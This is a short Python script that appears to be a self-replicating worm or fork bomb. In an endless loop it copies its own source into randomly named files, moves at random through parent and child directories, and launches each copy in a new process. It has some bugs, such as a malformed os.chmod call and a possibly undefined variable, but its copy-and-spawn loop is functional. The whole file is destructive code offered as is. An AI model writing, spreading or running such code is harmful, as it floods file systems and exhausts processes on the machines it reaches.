#!/usr/bin/env python3
import os
from random import randint, shuffle, choice
import multiprocessing

en = __file__.split('.')
en = '.' + en[len(en)-1]
pre = ''
while True:
    ls = "a b c d e f g h i j k l m n o p q u r s t u v w x y z _ _ . ".split(" ")
    shuffle(ls)
    pre = os.getcwd()
    try:
        me = open(__file__, "r")
        print(1)
        name = pre + '/' + ''.join(ls[0:randint(3, len(ls)-1)]) + en
        print(name)
        file = open(name, "w+")
    except:
        pass
    else:
        for line in me:
            file.write(line)
        print(name)
        file.close()
        try:
            os.chmod('name')
        except:
            pass
        try:
            p = multiprocessing.Process(target= lambda: os.system(f"python3 {name}"))
        except:
          pass
        try:
            p1 = multiprocessing.Process(target= lambda: os.system(f"python {name}"))
        except:
            pass
        try:
            p2 = multiprocessing.Process(target= lambda: os.system(f"{name}"))
        except:
            pass  
    if randint(0, 5) == 3:
        try:
            folders = next(os.walk('.'))
        except:
            pass
        if len(folders) > 1:
            try:
                os.chdir(choice(folders[1]))
            except:
                pass
    elif randint(0, 4) == 2:
        os.chdir("..")
    try:
      p.start()
    except:
      try:
        p1.start()
      except:
        p2.start()
